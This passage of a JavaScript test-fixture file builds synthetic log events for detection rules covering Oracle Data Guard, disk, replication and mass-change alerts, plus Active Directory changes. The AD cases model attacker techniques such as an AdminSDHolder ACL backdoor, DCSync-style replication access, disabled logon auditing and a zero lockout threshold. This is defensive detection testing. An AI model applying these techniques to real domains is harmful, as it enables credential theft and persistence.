  neg: [gg({ action: 'dg-process' }, { role: 'PHYSICAL STANDBY', mrp: '1', rfs: '2' }), gg({ action: 'dg-process' }, { role: 'PRIMARY', mrp: '0', rfs: '0' })],
};
F['SENTRA-ORAP-033'] = {
  pos: [gg({ action: 'dg-config', severity: 3 }, { role: 'PRIMARY', force_logging: 'NO', standbys: '1' })],
  neg: [gg({ action: 'dg-config', severity: 1 }, { role: 'PRIMARY', force_logging: 'YES', flashback: 'NO', standbys: '1' }), gg({ action: 'dg-config' }, { role: 'PRIMARY', force_logging: 'NO', standbys: '0' })],
};
F['SENTRA-ORAP-034'] = {
  pos: [gg({ action: 'dg-error', severity: 4 }, { key: '16198', severity: 'Fatal', message: 'ORA-16198: Timeout incurred on internal channel' }), gg({ action: 'dg-broker', severity: 3 }, { key: 'ESS_DR', status: '16809' })],
  neg: [gg({ action: 'dg-broker' }, { key: 'ESS_DR', status: '0' })],
};
F['SENTRA-ORAP-040'] = {
  pos: [gg({ action: 'db-server-fs', severity: 4 }, { key: '/u02', mount: '/u02', used_pct: '97', oracle_fs: 'true' })],
  neg: [gg({ action: 'db-server-fs', severity: 3 }, { key: '/u02', mount: '/u02', used_pct: '91' }), gg({ action: 'tablespace-usage' }, { used_pct: '99' })],
};
F['SENTRA-ORAP-041'] = {
  pos: [gg({ action: 'db-server', severity: 4 }, { key: '192.168.9.30', oratab_down: 'ESS' }), gg({ action: 'db-server', severity: 3 }, { key: '192.168.9.30', load5: '40', ncpu: '16' })],
  neg: [gg({ action: 'db-server', severity: 2 }, { key: '192.168.9.30', ntp_synced: 'false' })],
};
F['SENTRA-ORAP-050'] = {
  pos: [gg({ action: 'db-change', severity: 3, user: 'scott' }, { key: 'X1', rows: '25000', deletes: '25000', mass: 'true', program: 'sqlplus@pc-17' }), gg({ action: 'db-change', severity: 3 }, { key: 'X2', rows: '0', ddl: 'truncate table "APP"."ORDERS"' })],
  neg: [gg({ action: 'db-change', severity: 2 }, { key: 'X3', rows: '5000', updates: '5000', mass: 'true', program: 'JDBC Thin Client' })],
};
F['SENTRA-ORAP-051'] = {
  pos: [gg({ action: 'db-change', severity: 2, user: 'scott' }, { key: 'X4', rows: '3', updates: '3', program: 'sqlplus@pc-17', interactive: '1' })],
  neg: [gg({ action: 'db-change' }, { key: 'X5', rows: '3', program: 'JDBC Thin Client' }), gg({ action: 'db-change', severity: 2 }, { key: 'X6', rows: '0', program: 'sqlplus@pc-17', interactive: '1' })],
};
F['SENTRA-ORAP-052'] = {
  pos: [gg({ action: 'replication', severity: 4 }, { key: 'REP-0001', state: 'stopped', reason: 'conflict' }), gg({ action: 'change-stream', severity: 3 }, { key: 'CS-0001', state: 'stopped', reason: 'gap' })],
  neg: [gg({ action: 'replication' }, { key: 'REP-0001', state: 'running', lag_s: '8' })],
};
F['SENTRA-ORAP-053'] = {
  pos: [gg({ action: 'data-verify', severity: 3 }, { key: 'VER-0001', in_sync: 'false', missing: '1', different: '1' })],
  neg: [gg({ action: 'data-verify' }, { key: 'VER-0001', in_sync: 'true' })],
};
// AD change auditing (engine/detect/rules/ad-changes.json): fields as parse/windows.js produces them for 5136-5141 / 4662 /
// 4719 / 4739. SYNTHETIC domain synthetic.test.
const adc = (code, f, o) => win(Object.assign({ event_code: String(code), category: 'iam', action: 'ad-object-modified', outcome: 'success', user: 'adm.syn', domain: 'syn', host: 'dc01.synthetic.test', tags: ['synthetic-test', 'ad-change'], fields: f }, o || {}));
const SYN_DN = 'DC=synthetic,DC=test';
const GPO_SYN = '6AC1786C-016F-11D2-945F-00C04FB984F9';
F['SENTRA-ADC-001'] = {
  pos: [adc(5136, { ad_kind: 'acl', ad_op: 'value-added', ad_privileged_object: '1', ad_object_dn: 'CN=AdminSDHolder,CN=System,' + SYN_DN, ad_attribute: 'nTSecurityDescriptor', ad_value: 'O:DAG:DAD:PAI(A;;GA;;;DA)(A;;GA;;;S-1-5-21-1-2-3-4242)' })],
  neg: [
    adc(5136, { ad_kind: 'acl', ad_op: 'value-deleted', ad_privileged_object: '1', ad_object_dn: 'CN=AdminSDHolder,CN=System,' + SYN_DN, ad_attribute: 'nTSecurityDescriptor' }),   // the old half
    adc(5136, { ad_kind: 'acl', ad_op: 'value-added', ad_object_dn: 'CN=Some Group,OU=Groups,' + SYN_DN, ad_attribute: 'nTSecurityDescriptor' }),                           // not privileged
    adc(5136, { ad_kind: 'attribute', ad_op: 'value-added', ad_privileged_object: '1', ad_object_dn: 'CN=Domain Admins,CN=Users,' + SYN_DN, ad_attribute: 'description' }),
  ],
};
F['SENTRA-ADC-002'] = {
  pos: [adc(5136, { ad_kind: 'gpo-link', ad_op: 'value-added', ad_object_dn: 'OU=Servers,' + SYN_DN, ad_attribute: 'gPLink', gpo_links: GPO_SYN + ':2' })],
  neg: [adc(5136, { ad_kind: 'gpo-link', ad_op: 'value-deleted', ad_object_dn: 'OU=Servers,' + SYN_DN, ad_attribute: 'gPLink' }), adc(5136, { ad_kind: 'attribute', ad_op: 'value-added', ad_object_dn: 'OU=Servers,' + SYN_DN, ad_attribute: 'description' })],
};
F['SENTRA-ADC-003'] = {
  pos: [adc(5136, { ad_kind: 'gpo', ad_op: 'value-added', gpo_guid: GPO_SYN, ad_attribute: 'versionNumber', ad_value: '196616' }), adc(5141, { ad_kind: 'gpo', ad_op: 'deleted', gpo_guid: '0D0D0D0D-AAAA-BBBB-CCCC-DDDDDDDDDDDD' }, { action: 'ad-object-deleted' })],
  neg: [adc(5136, { ad_kind: 'gpo', ad_op: 'value-deleted', gpo_guid: GPO_SYN, ad_attribute: 'versionNumber' }), adc(5139, { ad_kind: 'object', ad_op: 'moved' }, { action: 'ad-object-moved' })],
};
F['SENTRA-ADC-004'] = {
  pos: [adc(5136, { ad_kind: 'schema', ad_op: 'value-added', schema_object: 'ms-Syn-Test-Attr', ad_attribute: 'isMemberOfPartialAttributeSet', ad_value: 'TRUE' })],
  neg: [adc(5136, { ad_kind: 'schema', ad_op: 'value-deleted', schema_object: 'ms-Syn-Test-Attr', ad_attribute: 'isMemberOfPartialAttributeSet' }), adc(5136, { ad_kind: 'attribute', ad_op: 'value-added', ad_attribute: 'title' })],
};
F['SENTRA-ADC-005'] = {
  pos: [
    adc(5136, { ad_kind: 'dns', ad_op: 'value-deleted', ad_attribute: 'dnsRecord', dns_zone: 'synthetic.test', dns_record: 'app01', dns_record_type: 'A', dns_record_data: '10.10.1.20' }),
    adc(5141, { ad_kind: 'dns', ad_op: 'deleted', dns_zone: 'synthetic.test', dns_record: 'old01' }, { action: 'ad-object-deleted' }),
  ],
  neg: [
    adc(5136, { ad_kind: 'dns', ad_op: 'value-deleted', ad_attribute: 'dnsRecord', dns_zone: 'synthetic.test', dns_record: 'pc07', dns_self_update: '1' }, { user: 'pc07$' }),   // the host's own update
    adc(5136, { ad_kind: 'dns', ad_op: 'value-added', ad_attribute: 'dnsRecord', dns_zone: 'synthetic.test', dns_record: 'new01' }),                                            // a value added only
  ],
};
F['SENTRA-ADC-006'] = {
  pos: [win({ event_code: '4719', category: 'policy', action: 'config-change', user: 'adm.syn', host: 'dc01.synthetic.test', fields: { audit_category: 'Logon/Logoff', audit_subcategory: 'Logon', audit_changes: 'Success removed, Failure removed', audit_removed: '1' } })],
  neg: [win({ event_code: '4719', category: 'policy', action: 'config-change', user: 'adm.syn', host: 'dc01.synthetic.test', fields: { audit_subcategory: 'Logon', audit_changes: 'Success added' } })],
};
F['SENTRA-ADC-007'] = {
  pos: [win({ event_code: '4739', category: 'policy', action: 'config-change', user: 'adm.syn', fields: { domain_policy_changed: 'Lockout Policy', policy_changed_settings: 'LockoutThreshold', 'policy.LockoutThreshold': '0' } })],
  neg: [win({ event_code: '4719', category: 'policy', action: 'config-change', user: 'adm.syn', fields: { audit_subcategory: 'Logon', audit_changes: 'Success added' } })],
};
F['SENTRA-ADC-008'] = {
  pos: [adc(4662, { ad_op: 'access', ad_dcsync: '1', ad_access: 'Control Access', ad_object_class: 'domainDNS' }, { action: 'ad-object-access', user: 'mallory.syn' })],
  neg: [adc(4662, { ad_op: 'access', ad_dcsync: '1', ad_access: 'Control Access', ad_object_class: 'domainDNS' }, { action: 'ad-object-access', user: 'dc02$' }), adc(4662, { ad_op: 'access', ad_kind: 'acl', ad_access: 'WRITE_DAC' }, { action: 'ad-object-access' })],
};
// Exchange (on-prem + hybrid) rule fixtures live in their own file; merged here so every rule is covered.
const exo = require('./detect-fixtures-exchange');
Object.assign(F, exo.FIXTURES);
INTEL.lists = Object.assign({}, exo.INTEL_LISTS);
